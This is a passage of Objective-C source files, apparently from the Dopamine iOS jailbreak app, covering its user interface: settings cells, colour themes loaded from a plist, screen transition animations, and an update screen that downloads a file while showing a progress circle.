        [self.contentView addSubview:chevronView];
        [NSLayoutConstraint activateConstraints:@[
            [chevronView.trailingAnchor constraintEqualToAnchor:self.label.trailingAnchor constant:17],
            [chevronView.centerYAnchor constraintEqualToAnchor:self.label.centerYAnchor],
        ]];
        
    }
    return self;
}

- (void)touchesBegan:(NSSet<UITouch *> *)touches withEvent:(UIEvent *)event
{
    self.alpha = 0.5;
}

- (void)touchesEnded:(NSSet<UITouch *> *)touches withEvent:(UIEvent *)event
{
    [UIView animateWithDuration:0.1 animations:^{
        self.alpha = 1.0;
    }];
    if (self.url)
        [[UIApplication sharedApplication] openURL:self.url options:@{} completionHandler:nil];
}

- (void)touchesCancelled:(NSSet<UITouch *> *)touches withEvent:(UIEvent *)event
{
    [UIView animateWithDuration:0.1 animations:^{
        self.alpha = 1.0;
    }];
}

- (void)setName:(NSString*)name url:(NSURL*)url
{
    self.label.text = name;
    self.url = url;
}

@end


@interface DOCreditsCell ()
@property (nonatomic, strong) NSArray<NSDictionary*> *names;
@property (nonatomic, strong) UICollectionView *collectionView;
@end

@implementation DOCreditsCell

- (id)initWithSpecifier:(PSSpecifier*)specifier
{
    if (self = [super init])
    {
        self.names = [specifier propertyForKey:@"names"];
        
        UICollectionViewFlowLayout *layout = [[UICollectionViewFlowLayout alloc] init];
        layout.scrollDirection = UICollectionViewScrollDirectionVertical;
        layout.minimumInteritemSpacing = 0;
        layout.minimumLineSpacing = 0;
        layout.sectionInset = UIEdgeInsetsMake(0, 0, 0, 0);

        self.collectionView = [[UICollectionView alloc] initWithFrame:CGRectZero collectionViewLayout:layout];
        self.collectionView.translatesAutoresizingMaskIntoConstraints = NO;
        self.collectionView.backgroundColor = [UIColor clearColor];
        self.collectionView.showsVerticalScrollIndicator = NO;
        self.collectionView.showsHorizontalScrollIndicator = NO;

        [self.collectionView registerClass:[DOCreditsCellItem class] forCellWithReuseIdentifier:@"item"];
        self.collectionView.delegate = self;
        self.collectionView.dataSource = self;
        
        [self.contentView addSubview:self.collectionView];

        [NSLayoutConstraint activateConstraints:@[
            [self.collectionView.leadingAnchor constraintEqualToAnchor:self.leadingAnchor constant:20],
            [self.collectionView.trailingAnchor constraintEqualToAnchor:self.trailingAnchor constant:-20],
            [self.collectionView.topAnchor constraintEqualToAnchor:self.topAnchor constant:0],
            [self.collectionView.bottomAnchor constraintEqualToAnchor:self.bottomAnchor constant:-0],
        ]];
        
    }
    return self;
}

- (NSInteger)collectionView:(UICollectionView *)collectionView numberOfItemsInSection:(NSInteger)section
{
    return self.names.count;
}

- (UICollectionViewCell *)collectionView:(UICollectionView *)collectionView cellForItemAtIndexPath:(NSIndexPath *)indexPath
{
    DOCreditsCellItem *cell = [collectionView dequeueReusableCellWithReuseIdentifier:@"item" forIndexPath:indexPath];
    NSDictionary *name = self.names[indexPath.row];
    [cell setName:name[@"name"] url:[NSURL URLWithString:name[@"link"]]];
    return cell;
}


- (CGSize)collectionView:(UICollectionView *)collectionView layout:(UICollectionViewLayout *)collectionViewLayout sizeForItemAtIndexPath:(NSIndexPath *)indexPath
{
    return CGSizeMake(collectionView.frame.size.width/2, CREDITS_CELL_HEIGHT);
}

- (CGFloat)preferredHeightForWidth:(CGFloat)width
{
    return CREDITS_CELL_HEIGHT * ceil(self.names.count/2.0);
}



@end

```

`Application/Dopamine/UI/Settings/Specifiers/DOHeaderCell.h`:

```h
//
//  DOHeaderCell.h
//  Dopamine
//
//  Created by tomt000 on 26/01/2024.
//

#import <UIKit/UIKit.h>
#import <Preferences/PSTableCell.h>
#import <Preferences/PSSpecifier.h>

NS_ASSUME_NONNULL_BEGIN

@interface DOHeaderCell : UITableViewCell

@end

NS_ASSUME_NONNULL_END

```

`Application/Dopamine/UI/Settings/Specifiers/DOHeaderCell.m`:

```m
//
//  DOHeaderCell.m
//  Dopamine
//
//  Created by tomt000 on 26/01/2024.
//

#import "DOHeaderCell.h"

@implementation DOHeaderCell

- (id)initWithSpecifier:(PSSpecifier*)specifier
{
    if (self = [super init])
    {
        UILabel *titleLabel = [[UILabel alloc] init];
        [titleLabel setText:[specifier propertyForKey:@"title"]];
        [titleLabel setFont:[UIFont systemFontOfSize:17 weight:UIFontWeightMedium]];
        [titleLabel setTextColor:[UIColor whiteColor]];
        titleLabel.translatesAutoresizingMaskIntoConstraints = NO;
        
        [self.contentView addSubview:titleLabel];

        [NSLayoutConstraint activateConstraints:@[
            [titleLabel.centerYAnchor constraintEqualToAnchor:self.centerYAnchor constant:-3],
            [titleLabel.centerXAnchor constraintEqualToAnchor:self.centerXAnchor]
        ]];

        UIView *border = [[UIView alloc] init];
        border.translatesAutoresizingMaskIntoConstraints = NO;
        border.backgroundColor = [UIColor colorWithWhite:1.0 alpha:0.1];
        [self.contentView addSubview:border];

        [NSLayoutConstraint activateConstraints:@[
            [border.leadingAnchor constraintEqualToAnchor:self.leadingAnchor constant:20],
            [border.trailingAnchor constraintEqualToAnchor:self.trailingAnchor constant:-20],
            [border.bottomAnchor constraintEqualToAnchor:self.bottomAnchor constant:-2],
            [border.heightAnchor constraintEqualToConstant:1]
        ]];
    }
    return self;
}

- (CGFloat)preferredHeightForWidth:(CGFloat)width
{
	return 60;
}

@end

```

`Application/Dopamine/UI/Themes/DOTheme.h`:

```h
//
//  DOTheme.h
//  Dopamine
//
//  Created by tomt000 on 14/02/2024.
//

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>

NS_ASSUME_NONNULL_BEGIN

@interface DOTheme : NSObject

@property (nonatomic, retain) NSString *name;
@property (nonatomic, retain) NSString *icon;
@property (nonatomic, retain) NSString *key;
@property (nonatomic, retain) UIColor *actionMenuColor;
@property (nonatomic, retain) UIColor *windowColor;
@property (nonatomic, retain) UIImage *image;
@property (nonatomic, assign) float blur;
@property (nonatomic, assign) BOOL titleShadow;

- (id)initWithDictionary: (NSDictionary *)dictionary;

- (UIImage *)generateBootLogo;

@end


NS_ASSUME_NONNULL_END

```

`Application/Dopamine/UI/Themes/DOTheme.m`:

```m
//
//  DOTheme.m
//  Dopamine
//
//  Created by tomt000 on 14/02/2024.
//

#import "DOTheme.h"
#import "UIImage+Blur.h"

@interface DOTheme ()
@property (nonatomic, retain) NSString *imageName;
@end

@implementation DOTheme

- (id)initWithDictionary: (NSDictionary *)dictionary
{
    self = [super init];
    if (self) {
        self.name = [dictionary objectForKey:@"name"];
        self.icon = [dictionary objectForKey:@"icon"];
        self.key = [dictionary objectForKey:@"key"];
        self.imageName = [dictionary objectForKey:@"image"];
        self.windowColor = [self colorFromHexString:[dictionary objectForKey:@"windowColor"]];
        self.actionMenuColor = [self colorFromHexString:[dictionary objectForKey:@"actionMenuColor"]];
        self.blur = [[dictionary objectForKey:@"blur"] floatValue];
        self.titleShadow = [[dictionary objectForKey:@"titleShadow"] boolValue];
    }
    return self;
}

- (UIColor*)colorFromHexString:(NSString*)hexString
{
    unsigned int hexInt = 0;
    NSScanner *scanner = [NSScanner scannerWithString:hexString];
    [scanner scanHexInt:&hexInt];
    return [UIColor colorWithRed:((CGFloat)((hexInt & 0xFF0000) >> 16))/255.0 green:((CGFloat)((hexInt & 0xFF00) >> 8))/255.0 blue:((CGFloat)(hexInt & 0xFF))/255.0 alpha:((CGFloat)((hexInt & 0xFF000000) >> 24))/255.0];
}

- (UIImage *)image
{
    if (_image == nil)
        _image = [[UIImage imageNamed:self.imageName] imageWithBlur:self.blur];
    return _image;
}

- (UIImage *)generateBootLogo
{
    UIImage *backgroundImage = [self image];
    CGSize canvasSize = backgroundImage.size;

    UIImage *overlayImage = [UIImage imageNamed:@"DopamineLogo"];

    CGSize overlaySize = CGSizeMake(350, 350);
    CGPoint overlayOrigin = CGPointMake((canvasSize.width - overlaySize.width) / 2.0,
                                        (canvasSize.height - overlaySize.height) / 2.0);

    UIGraphicsBeginImageContextWithOptions(canvasSize, NO, backgroundImage.scale);

    [backgroundImage drawInRect:CGRectMake(0, 0, canvasSize.width, canvasSize.height)];

    // Render overlay (Dopamine Logo) in center of background for boot logo
    [overlayImage drawInRect:CGRectMake(overlayOrigin.x, overlayOrigin.y, overlaySize.width, overlaySize.height)];

    UIImage *finalImage = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();

    return finalImage;
}

@end

```

`Application/Dopamine/UI/Themes/DOThemeManager.h`:

```h
//
//  DOThemeManager.h
//  Dopamine
//
//  Created by tomt000 on 14/02/2024.
//

#import <Foundation/Foundation.h>
#import "DOTheme.h"

NS_ASSUME_NONNULL_BEGIN

@interface DOThemeManager : NSObject

@property (nonatomic, retain) NSArray<DOTheme*> *themes;

+ (instancetype)sharedInstance;

+ (UIColor*)menuColorWithAlpha:(float)alpha;
- (NSArray*)getAvailableThemeKeys;
- (NSArray*)getAvailableThemeNames;
- (DOTheme*)getThemeForKey:(NSString*)key;
- (DOTheme*)enabledTheme;

@end

NS_ASSUME_NONNULL_END

```

`Application/Dopamine/UI/Themes/DOThemeManager.m`:

```m
//
//  DOThemeManager.m
//  Dopamine
//
//  Created by tomt000 on 14/02/2024.
//

#import "DOThemeManager.h"
#import "DOPreferenceManager.h"

@implementation DOThemeManager

+ (instancetype)sharedInstance
{
    static DOThemeManager *sharedManager = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        sharedManager = [[DOThemeManager alloc] init];
    });
    return sharedManager;
}

- (id)init
{
    self = [super init];
    if (self) {
        self.themes = [[NSMutableArray alloc] init];
        
        NSString *path = [[NSBundle mainBundle] pathForResource:@"Themes" ofType:@"plist"];
        NSArray *themes = [NSArray arrayWithContentsOfFile:path];

        for (NSDictionary *theme in themes) {
            DOTheme *newTheme = [[DOTheme alloc] initWithDictionary:theme];
            [((NSMutableArray *)self.themes) addObject:newTheme];
        }

    }
    return self;
}

- (NSArray*)getAvailableThemeKeys
{
    NSMutableArray *keys = [[NSMutableArray alloc] init];
    for (DOTheme *theme in _themes) {
        [keys addObject:theme.key];
    }
    return keys;
}

- (NSArray*)getAvailableThemeNames
{
    NSMutableArray *names = [[NSMutableArray alloc] init];
    for (DOTheme *theme in _themes) {
        [names addObject:theme.name];
    }
    return names;
}

- (DOTheme*)getThemeForKey:(NSString*)key
{
    for (DOTheme *theme in _themes) {
        if ([theme.key isEqualToString:key]) {
            return theme;
        }
    }
    return nil;
}

- (DOTheme*)enabledTheme
{
    id value = [[DOPreferenceManager sharedManager] preferenceValueForKey:@"theme"];
    if (!value)
        return self.themes.firstObject;
    return [self getThemeForKey:value] ?: self.themes.firstObject;
}


+ (UIColor*)menuColorWithAlpha:(float)alpha
{
    DOTheme *theme = [[DOThemeManager sharedInstance] enabledTheme];
    
    UIColor *color = theme.actionMenuColor;
    CGFloat red, green, blue, currentAlpha;
    [color getRed:&red green:&green blue:&blue alpha:&currentAlpha];
    return [UIColor colorWithRed:red green:green blue:blue alpha:currentAlpha * alpha];
}


@end

```

`Application/Dopamine/UI/Themes/Themes.plist`:

```plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<array>
	<dict>
		<key>key</key>
		<string>default</string>
		<key>name</key>
		<string>Dopamine</string>
		<key>image</key>
		<string>Background_Green.jpg</string>
		<key>actionMenuColor</key>
		<string>723f3f3f</string>
		<key>windowColor</key>
		<string>994c4c4c</string>
		<key>blur</key>
		<integer>18</integer>
		<key>titleShadow</key>
		<false/>
	</dict>
	<dict>
		<key>key</key>
		<string>ellekit</string>
		<key>icon</key>
		<string>AppIcon_ElleKit</string>
		<key>name</key>
		<string>ElleKit</string>
		<key>image</key>
		<string>Background_ElleKit.jpg</string>
		<key>actionMenuColor</key>
		<string>3F610C71</string>
		<key>windowColor</key>
		<string>6009040A</string>
		<key>blur</key>
		<integer>18</integer>
		<key>titleShadow</key>
		<true/>
	</dict>
	<dict>
		<key>key</key>
		<string>blue</string>
		<key>icon</key>
		<string>AppIcon_Blue</string>
		<key>name</key>
		<string>Deep Blue Sky</string>
		<key>image</key>
		<string>Background_Blue.jpg</string>
		<key>actionMenuColor</key>
		<string>3F0C2571</string>
		<key>windowColor</key>
		<string>6004050A</string>
		<key>blur</key>
		<integer>40</integer>
		<key>titleShadow</key>
		<false/>
	</dict>
	<dict>
		<key>key</key>
		<string>red</string>
		<key>icon</key>
		<string>AppIcon_Red</string>
		<key>name</key>
		<string>Blood Sky</string>
		<key>image</key>
		<string>Background_Red.jpg</string>
		<key>actionMenuColor</key>
		<string>5F560808</string>
		<key>windowColor</key>
		<string>600A0404</string>
		<key>blur</key>
		<integer>25</integer>
		<key>titleShadow</key>
		<false/>
	</dict>
	<dict>
		<key>key</key>
		<string>purple</string>
		<key>icon</key>
		<string>AppIcon_Purple</string>
		<key>name</key>
		<string>Desert Dusk</string>
		<key>image</key>
		<string>Background_Purple.jpg</string>
		<key>actionMenuColor</key>
		<string>4F150C71</string>
		<key>windowColor</key>
		<string>6008040A</string>
		<key>blur</key>
		<integer>35</integer>
		<key>titleShadow</key>
		<false/>
	</dict>
</array>
</plist>

```

`Application/Dopamine/UI/Transition/DOModalBackAction.h`:

```h
//
//  DOModalBackAction.h
//  Dopamine
//
//  Created by tomt000 on 24/01/2024.
//

#import <UIKit/UIKit.h>

NS_ASSUME_NONNULL_BEGIN

@interface DOModalBackAction : UIView

@property (nonatomic) void (^action)(void);
@property (nonatomic) CGRect ignoreFrame;

-(id)initWithAction:(void (^)(void))action;

@end

NS_ASSUME_NONNULL_END

```

`Application/Dopamine/UI/Transition/DOModalBackAction.m`:

```m
//
//  DOModalBackAction.m
//  Dopamine
//
//  Created by tomt000 on 24/01/2024.
//

#import "DOModalBackAction.h"

@implementation DOModalBackAction

-(id)initWithAction:(void (^)(void))action
{
    if (self = [super init])
    {
        self.action = action;
    }
    return self;
}

- (BOOL)pointInside:(CGPoint)point withEvent:(UIEvent *)event {
    if (CGRectContainsPoint(self.ignoreFrame, point))
        return NO;
    return [super pointInside:point withEvent:event];
}

- (void)touchesEnded:(NSSet<UITouch *> *)touches withEvent:(UIEvent *)event {
    if (self.action)
        self.action();
}

@end

```

`Application/Dopamine/UI/Transition/DOModalTransitionPush.h`:

```h
//
//  DOModalTransitionPush.h
//  Dopamine
//
//  Created by tomt000 on 08/01/2024.
//

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>

NS_ASSUME_NONNULL_BEGIN

@interface DOModalTransitionPush : NSObject <UIViewControllerAnimatedTransitioning>

- (id)initForwards:(BOOL)forwards;

@end

NS_ASSUME_NONNULL_END

```

`Application/Dopamine/UI/Transition/DOModalTransitionPush.m`:

```m
//
//  DOModalTransitionPush.m
//  Dopamine
//
//  Created by tomt000 on 08/01/2024.
//

#import "DOModalTransitionPush.h"

@interface DOModalTransitionPush ()

@property (nonatomic, assign) BOOL forwards;

@end

@implementation DOModalTransitionPush

- (id)initForwards:(BOOL)forwards {
    self = [super init];
    if (self) {
        _forwards = forwards;
    }
    return self;
}


- (NSTimeInterval)transitionDuration:(nullable id<UIViewControllerContextTransitioning>)transitionContext {
    return 0.5;
}

- (void)animateTransition:(id<UIViewControllerContextTransitioning>)transitionContext {
    UIViewController *toViewController = [transitionContext viewControllerForKey:UITransitionContextToViewControllerKey];
    UIViewController *fromViewController = [transitionContext viewControllerForKey:UITransitionContextFromViewControllerKey];
    
    int screen_width = fromViewController.navigationController.view.bounds.size.width;

    [[transitionContext containerView] addSubview:toViewController.view];

    screen_width *= _forwards ? 1 : -1;

    
    toViewController.view.transform = CGAffineTransformTranslate(CGAffineTransformIdentity, screen_width, 0);
    fromViewController.view.transform = CGAffineTransformIdentity;
    
    [UIView animateWithDuration:0.6 delay:0.0 usingSpringWithDamping:0.9 initialSpringVelocity:2.0  options: UIViewAnimationOptionCurveEaseInOut animations:^{
        toViewController.view.transform = CGAffineTransformIdentity;
        fromViewController.view.transform = CGAffineTransformTranslate(CGAffineTransformIdentity, -screen_width, 0);
    } completion:^(BOOL finished) {
        fromViewController.view.transform = CGAffineTransformIdentity;
        [transitionContext completeTransition:!transitionContext.transitionWasCancelled];
    }];   
}

@end

```

`Application/Dopamine/UI/Transition/DOModalTransitionScale.h`:

```h
//
//  DOModalTransitionScale.h
//  Dopamine
//
//  Created by tomt000 on 08/01/2024.
//

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>

NS_ASSUME_NONNULL_BEGIN

@interface DOModalTransitionScale : NSObject <UIViewControllerAnimatedTransitioning>

- (id)initForwards:(BOOL)forwards;

@end

NS_ASSUME_NONNULL_END

```

`Application/Dopamine/UI/Transition/DOModalTransitionScale.m`:

```m
//
//  DOModalTransitionScale.m
//  Dopamine
//
//  Created by tomt000 on 08/01/2024.
//

#import "DOModalTransitionScale.h"

@interface DOModalTransitionScale ()

@property (nonatomic, assign) BOOL forwards;

@end

@implementation DOModalTransitionScale

- (id)initForwards:(BOOL)forwards {
    self = [super init];
    if (self) {
        _forwards = forwards;
    }
    return self;
}

- (NSTimeInterval)transitionDuration:(nullable id<UIViewControllerContextTransitioning>)transitionContext {
    return 0.5;
}

- (void)animateTransition:(id<UIViewControllerContextTransitioning>)transitionContext {
    UIViewController *toViewController = [transitionContext viewControllerForKey:UITransitionContextToViewControllerKey];
    UIViewController *fromViewController = [transitionContext viewControllerForKey:UITransitionContextFromViewControllerKey];

    [[transitionContext containerView] addSubview:toViewController.view];

    float scaleIn = _forwards ? 0.7 : 0.9;
    float scaleOut = _forwards ? 0.9 : 0.7;

    toViewController.view.alpha = 0;
    toViewController.view.transform = CGAffineTransformScale(CGAffineTransformIdentity, scaleIn, scaleIn);

    [UIView animateWithDuration:0.2 animations:^{
        fromViewController.view.alpha = 0;
    }];
    
    [UIView animateWithDuration:0.6 delay:0.0 usingSpringWithDamping:0.9 initialSpringVelocity:2.0  options: UIViewAnimationOptionCurveEaseInOut animations:^{
        toViewController.view.alpha = 1;
        toViewController.view.transform = CGAffineTransformIdentity;
        fromViewController.view.transform = CGAffineTransformScale(CGAffineTransformIdentity, scaleOut, scaleOut);
    } completion:^(BOOL finished) {
        fromViewController.view.transform = CGAffineTransformIdentity;
        [transitionContext completeTransition:!transitionContext.transitionWasCancelled];
    }];
}

@end

```

`Application/Dopamine/UI/Update/DODownloadViewController.h`:

```h
//
//  DODownloadViewController.h
//  Dopamine
//
//  Created by tomt000 on 07/02/2024.
//

#import <UIKit/UIKit.h>

NS_ASSUME_NONNULL_BEGIN

@interface DODownloadViewController : UIViewController

- (id)initWithUrl:(NSString *)urlString callback:(void (^)(NSURL *file))callback;

@end

NS_ASSUME_NONNULL_END

```

`Application/Dopamine/UI/Update/DODownloadViewController.m`:

```m
//
//  DODownloadViewController.m
//  Dopamine
//
//  Created by tomt000 on 07/02/2024.
//

#import "DODownloadViewController.h"
#import "DOUpdateCircleView.h"
#import "DOUIManager.h"

@interface DODownloadViewController ()

@property (strong, nonatomic) DOUpdateCircleView *circleView;
@property (strong, nonatomic) NSString *urlString;
@property (copy, nonatomic) void (^downloadCallback)(NSURL *file);

@property (nonatomic, retain) UILabel *titleLabel;
@property (nonatomic, retain) UILabel *descriptionLabel;

@end

@implementation DODownloadViewController

- (id)initWithUrl:(NSString *)urlString callback:(void (^)(NSURL *file))callback {
    self = [super init];
    if (self) {
        self.urlString = urlString;
        self.downloadCallback = callback;
    }
    return self;
}

- (void)viewDidLoad {
    [super viewDidLoad];

    UIStackView *stackView = [[UIStackView alloc] init];
    stackView.axis = UILayoutConstraintAxisVertical;
    stackView.alignment = UIStackViewAlignmentCenter;
    stackView.distribution = UIStackViewDistributionEqualSpacing;
    stackView.spacing = 10;
    stackView.translatesAutoresizingMaskIntoConstraints = NO;

    self.titleLabel = [[UILabel alloc] init];
    self.titleLabel.text = DOLocalizedString(@"Update_Status_Downloading");
    self.titleLabel.font = [UIFont systemFontOfSize:24 weight:UIFontWeightMedium];
    self.titleLabel.textColor = [UIColor colorWithWhite:1.0 alpha:1.0];

    self.descriptionLabel = [[UILabel alloc] init];
    self.descriptionLabel.text = DOLocalizedString(@"Update_Status_Subtitle_Please_Wait");
    self.descriptionLabel.font = [UIFont systemFontOfSize:18 weight:UIFontWeightRegular];
    self.descriptionLabel.textColor = [UIColor colorWithWhite:1.0 alpha:0.5];
    self.descriptionLabel.textAlignment = NSTextAlignmentCenter;
    self.descriptionLabel.numberOfLines = 0;

    self.circleView = [[DOUpdateCircleView alloc] initWithFrame:CGRectNull];
    self.circleView.translatesAutoresizingMaskIntoConstraints = NO;

    UIView *spacer = [[UIView alloc] init];
    spacer.translatesAutoresizingMaskIntoConstraints = NO;

    [stackView addArrangedSubview:self.titleLabel];
    [stackView addArrangedSubview:self.descriptionLabel];
    [stackView addArrangedSubview:spacer];
    [stackView addArrangedSubview:self.circleView];

    [NSLayoutConstraint activateConstraints:@[
        [self.circleView.widthAnchor constraintEqualToConstant:150],
        [self.circleView.heightAnchor constraintEqualToConstant:150],
        [spacer.heightAnchor constraintEqualToConstant:20]
    ]];   

    [self.view addSubview:stackView];

    [NSLayoutConstraint activateConstraints:@[
        [stackView.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
        [stackView.centerYAnchor constraintEqualToAnchor:self.view.centerYAnchor],
        [stackView.widthAnchor constraintEqualToAnchor:self.view.widthAnchor multiplier:0.8]
    ]];

    [self startDownload];
}

- (void)startDownload {
    NSURL *url = [NSURL URLWithString:self.urlString];
    if (!url) {
        NSLog(@"Invalid URL");
        return;
    }

    NSURLSession *session = [NSURLSession sharedSession];
    NSURLSessionDownloadTask *downloadTask = [session downloadTaskWithURL:url completionHandler:^(NSURL *location, NSURLResponse *response, NSError *error) {
        if (error) {
            NSLog(@"Download error: %@", error.localizedDescription);
            return;
        }

        NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
        NSString *documentsDirectory = [paths objectAtIndex:0];
        NSString *destinationPath = [documentsDirectory stringByAppendingPathComponent:[location lastPathComponent]];
        NSURL *destinationURL = [NSURL fileURLWithPath:destinationPath];

        NSError *fileError;
        [[NSFileManager defaultManager] moveItemAtURL:location toURL:destinationURL error:&fileError];
        if (fileError) {
            NSLog(@"File moving error: %@", fileError.localizedDescription);
            return;
        }

        dispatch_async(dispatch_get_main_queue(), ^{
            if (self.downloadCallback) {
                self.downloadCallback(destinationURL);
                [self startBlinking];
            }
        });
    }];

    [downloadTask resume];

    [self trackDownloadProgress:downloadTask];
}

- (void)trackDownloadProgress:(NSURLSessionDownloadTask *)downloadTask {
    [NSTimer scheduledTimerWithTimeInterval:(1.0/60.0) repeats:YES block:^(NSTimer * _Nonnull timer) {
        if (self.circleView.progress >= 0.99) {
            [timer invalidate];
            self.circleView.progress = 1.0;
            return;
        }

        [downloadTask countOfBytesExpectedToReceive];
        if (downloadTask.countOfBytesExpectedToReceive > 0) {
            float progress = (float) downloadTask.countOfBytesReceived / (float) downloadTask.countOfBytesExpectedToReceive;
            if (self.circleView.progress < progress) {
                self.circleView.progress += (progress - self.circleView.progress) * 0.25;
            }
        }
    }];
}

- (void)startBlinking {
    self.titleLabel.text = DOLocalizedString(@"Update_Status_Installing");
    self.descriptionLabel.text = DOLocalizedString(@"Update_Status_Subtitle_Restart_Soon");
    [UIView animateWithDuration:0.5 delay:0 options:UIViewAnimationOptionAutoreverse | UIViewAnimationOptionRepeat | UIViewAnimationOptionAllowUserInteraction animations:^{
        self.circleView.alpha = 0.7;
    } completion:nil];
}

#pragma mark - Status Bar

- (UIStatusBarStyle)preferredStatusBarStyle
{
    return UIStatusBarStyleLightContent;
}


@end

```

`Application/Dopamine/UI/Update/DOUpdateCircleView.h`:

```h
//
//  DOUpdateCircleView.h
//  Dopamine
//
//  Created by tomt000 on 06/02/2024.
//

#import <UIKit/UIKit.h>

NS_ASSUME_NONNULL_BEGIN

@interface DOUpdateCircleView : UIView

@property (nonatomic, assign) float progress;

@end

NS_ASSUME_NONNULL_END

```

`Application/Dopamine/UI/Update/DOUpdateCircleView.m`:

```m
//
//  DOUpdateCircleView.m
//  Dopamine
//
//  Created by tomt000 on 06/02/2024.
//

#import "DOUpdateCircleView.h"

@interface DOUpdateCircleView ()

@property (nonatomic, strong) CAShapeLayer *circleLayer;
@property (nonatomic, strong) CAShapeLayer *progressLayer;
@property (nonatomic, strong) UILabel *label;

@end

@implementation DOUpdateCircleView

- (id)initWithFrame:(CGRect)frame {
    self = [super initWithFrame:frame];
    if (self) {
        [self setup];
    }
    return self;
}

-(void)setup {
    self.backgroundColor = [UIColor clearColor];

    self.circleLayer = [CAShapeLayer layer];
    self.circleLayer.fillColor = [UIColor clearColor].CGColor;
    self.circleLayer.strokeColor = [UIColor colorWithWhite:1.0 alpha:0.1].CGColor;
    self.circleLayer.lineWidth = 10.0;

    self.progressLayer = [CAShapeLayer layer];
    self.progressLayer.fillColor = [UIColor clearColor].CGColor;
    self.progressLayer.strokeColor = [UIColor whiteColor].CGColor;
    self.progressLayer.lineWidth = 10.0;
    self.progressLayer.lineCap = kCALineCapRound;

    [self.layer addSublayer:self.circleLayer];
    [self.layer addSublayer:self.progressLayer];
    
    self.label = [[UILabel alloc] initWithFrame:self.bounds];
    self.label.textAlignment = NSTextAlignmentCenter;
    self.label.textColor = [UIColor whiteColor];
    self.label.font = [UIFont systemFontOfSize:29 weight:UIFontWeightMedium];
    self.label.translatesAutoresizingMaskIntoConstraints = NO;

    [self addSubview:self.label];

    [NSLayoutConstraint activateConstraints:@[
        [self.label.centerXAnchor constraintEqualToAnchor:self.centerXAnchor],
        [self.label.centerYAnchor constraintEqualToAnchor:self.centerYAnchor],
        [self.label.widthAnchor constraintEqualToAnchor:self.widthAnchor],
        [self.label.heightAnchor constraintEqualToAnchor:self.heightAnchor]
    ]];
}

- (void)setProgress:(float)progress {
    _progress = progress;
    self.label.text = [NSString stringWithFormat:@"%d%%", (int)(progress * 100)];
    [self updateCirclePaths];
    [self setNeedsDisplay];
}

- (void)layoutSubviews {
    [super layoutSubviews];
    [self updateCirclePaths];
}

- (void)updateCirclePaths {
    CGPoint center = CGPointMake(CGRectGetMidX(self.bounds), CGRectGetMidY(self.bounds));
    CGFloat radius = MIN(self.bounds.size.width, self.bounds.size.height) / 2 - self.circleLayer.lineWidth / 2;

    CGFloat startAngle = -((float)M_PI / 2);
    CGFloat endAngle = (2 * (float)M_PI) + startAngle;

    UIBezierPath *circlePath = [UIBezierPath bezierPathWithArcCenter:center radius:radius startAngle:startAngle endAngle:endAngle clockwise:YES];
    self.circleLayer.path = circlePath.CGPath;

    UIBezierPath *progressPath = [UIBezierPath bezierPathWithArcCenter:center radius:radius startAngle:startAngle endAngle:(endAngle - startAngle) * self.progress + startAngle clockwise:YES];
    self.progressLayer.path = progressPath.CGPath;
}


@end

```

`Application/Dopamine/UI/Update/DOUpdateViewController.h`:

```h
//
//  DOUpdateViewController.h
//  Dopamine
//
//  Created by tomt000 on 06/02/2024.
//

#import <UIKit/UIKit.h>

NS_ASSUME_NONNULL_BEGIN

@interface DOUpdateViewController : UIViewController

- (id)initFromTag:(NSString *)fromTag toTag:(NSString *)toTag;

@end

NS_ASSUME_NONNULL_END

```

`Application/Dopamine/UI/Update/DOUpdateViewController.m`:

```m
//
//  DOUpdateViewController.m
//  Dopamine
//
//  Created by tomt000 on 06/02/2024.
//

#import "DOUpdateViewController.h"
#import "DOUpdateCircleView.h"
#import "DOActionMenuButton.h"
#import "DOGlobalAppearance.h"
#import "DODownloadViewController.h"
#import "DOUIManager.h"
#import "DOEnvironmentManager.h"
#import <CoreServices/LSApplicationProxy.h>

@interface DOUpdateViewController ()

@property (strong, nonatomic) UITextView *changelog;
@property (strong, nonatomic) NSString *lastestDownloadUrl;
@property (strong, nonatomic) CAGradientLayer *gradientMask;
@property (strong, nonatomic) UIView *changelogSuperview;
@property (strong, nonatomic) DOActionMenuButton *button;

@property (strong, nonatomic) NSString *fromTag;
@property (strong, nonatomic) NSString *toTag;

@end

@implementation DOUpdateViewController

- (id)initFromTag:(NSString *)fromTag toTag:(NSString *)toTag
{
    if (self = [super init])
    {
        self.fromTag = fromTag;
        self.toTag = toTag;
    }
    return self;
}

- (void)viewDidLoad {
    [super viewDidLoad];

    UILabel *title = [[UILabel alloc] init];
    title.text = DOLocalizedString(@"Title_Changelog");
    title.font = [UIFont systemFontOfSize:24 weight:UIFontWeightMedium];
    title.textColor = [UIColor colorWithWhite:1.0 alpha:1.0];
    title.textAlignment = NSTextAlignmentCenter;
    title.translatesAutoresizingMaskIntoConstraints = NO;

    [self.view addSubview:title];

    [NSLayoutConstraint activateConstraints:@[
        [title.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
        [title.topAnchor constraintEqualToAnchor:self.view.topAnchor constant:20]
    ]];

    self.changelogSuperview = [[UIView alloc] init];
    self.changelogSuperview.translatesAutoresizingMaskIntoConstraints = NO;

    self.changelog = [[UITextView alloc] init];
    self.changelog.font = [UIFont systemFontOfSize:16];
    self.changelog.textColor = [UIColor colorWithWhite:1.0 alpha:1.0];
    self.changelog.backgroundColor = [UIColor clearColor];
    self.changelog.translatesAutoresizingMaskIntoConstraints = NO;
    self.changelog.editable = NO;
    self.changelog.textAlignment = NSTextAlignmentCenter;
    self.changelog.alpha = 0.7;

    NSMutableParagraphStyle * paragraphStyle = [[NSMutableParagraphStyle alloc] init];
    paragraphStyle.alignment = NSTextAlignmentCenter;

    [self.changelogSuperview addSubview:self.changelog];
    [self.view addSubview:self.changelogSuperview];

    [NSLayoutConstraint activateConstraints:@[
        [self.changelogSuperview.topAnchor constraintEqualToAnchor:title.bottomAnchor constant:20],
        [self.changelogSuperview.leadingAnchor constraintEqualToAnchor:self.view.leadingAnchor],
